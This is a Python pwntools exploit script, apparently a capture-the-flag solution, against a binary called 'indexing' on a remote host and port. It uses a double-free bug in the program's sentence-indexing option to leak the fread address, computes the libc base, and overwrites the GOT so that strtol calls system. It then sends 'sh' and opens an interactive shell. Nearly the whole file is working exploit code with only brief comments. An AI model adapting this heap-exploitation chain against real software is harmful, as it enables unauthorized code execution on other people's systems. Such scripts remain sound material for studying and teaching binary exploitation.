#!/usr/bin/env python

from pwn import *
import time

LOCAL = False

lib = ELF('./libc.so.6.64')

if not LOCAL:
    r = remote('172.16.113.50', 12013)
else:
    r = process('./indexing')
    print r.proc.pid
    a = raw_input('Wait gdb attach...\n')

"""
CANARY    : ENABLED
FORTIFY   : ENABLED
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
"""

"""
Description:

Option2 will indexing a sentence, and split it by space

it will use byte=null to make sure there is a sentence or not,
but the place will be filled with FD after it being freed, 
so it's will cause a problem of double free

Because it's use read so we can use \x00 to match the check
"""

"""
main 0x0400d60
option1 0x4009df
option2 0x400c00
"""

def Option1(size, word):
    res = r.recvuntil('Quit\n')
    # print res  
    r.sendline('1')
    res = r.recvline()
    # print res
    r.sendline(size) # size
    res = r.recvline()
    # print res
    r.sendline(word) 
    res = r.recvuntil('(y/n)?\n')
    # print res
    r.sendline('y')
    
def Option2(size, sentence):
    res = r.recvuntil('Quit\n')
    # print res
    
    r.sendline('2')
    res = r.recvline()
    # print res
    r.sendline(size) # size
    res = r.recvline()
    # print res 
    r.sendline(sentence)

def GetLeak():
    res = r.recvuntil('Quit\n')
    # print res  
    
    r.sendline('1')
    res = r.recvline()
    # print res
    r.sendline('1') # size
    res = r.recvline()
    # print res
    r.sendline('1') 
    res = r.recvuntil('(y/n)?\n')
    # print res
    r.sendline('n')
    return u64(res.split('\n')[0].split(': ')[1])



if __name__ == "__main__":

    # double free in size 0x40   
    Option2('0x30', 'A'*0x2e+' '+'A'   )
    Option2('0x30', 'B'*0x2d+' '+'BB'  )
    Option2('0x30', 'C'*0x2c+' '+'CCC' )
    Option2('0x30', 'D'*0x2b+' '+'DDDD')
    
    Option1('1', 'A'     )
    Option1('2', 'BB'    )
    Option1('3', 'CCC'   )
    Option1('4', 'DDDD'  ) 
    Option1('3', '\x00'*3)    

    # double free in size 0x30
    Option2('0x20', 'A'*(0x20-6)+' ' + 'A'*5)
    Option2('0x20', 'B'*(0x20-7)+' ' + 'B'*6)
    Option2('0x20', 'C'*(0x20-8)+' ' + 'C'*7)

    Option1('5', 'A'*5)
    Option1('6', 'B'*6)
    Option1('7', 'C'*7)
    Option1('6', '\x00'*6)
   
    # leak address by double free in 0x30
    Option2('0x40', '\x00'*8 + p64(0x30) + '\x00'*(0x40-8-8))
    Option2('0x40', 'A'*0x40)

    # random choose a place to control the check
    #                     '1'                      fread         
    Option2('0x20', p64(0x400f0c) + p64(1) + p64(0x602030) + p64(8))   
    fread_add = GetLeak()

    # count the address
    lib_base =  fread_add - lib.symbols['fread']
    sys_add = lib_base + lib.symbols['system']
    memset_add = lib_base + lib.symbols['memset']
    strtol_add = lib_base + lib.symbols['strtol']
    malloc_add = lib_base + lib.symbols['malloc']
    __printf_chk = lib_base + lib.symbols['__printf_chk']


    """ function layout
    trash trash
    trash trash
    strtol malloc
    __printf_chk  trash 
    """
    print '[*] libc_base        = ',hex(lib_base)
    print '[*] sys_add          = ',hex(sys_add)
    print '[*] strtol_add       = ',hex(strtol_add)       
    print '[*] malloc_add       = ',hex(malloc_add)
    print '[*] __printf_chk_add = ',hex(__printf_chk)


    # got hijack by double free in size 0x40
    # target 0x602032
    Option2('0x30', p64(0x602032) + '\x00'*(0x30-8))
    Option2('0x30', 'A'*0x30)
    Option2('0x30', 'A'*0x30)
    # 
    Option2('0x30', p64(memset_add)[2:] + p64(memset_add)*3 + p64(sys_add) + p64(malloc_add) + p64(__printf_chk)[:2])

    res = r.recvuntil('Quit\n')
       
    # strtol() -> system('sh')
    r.sendline('sh') 
    r.interactive()
 

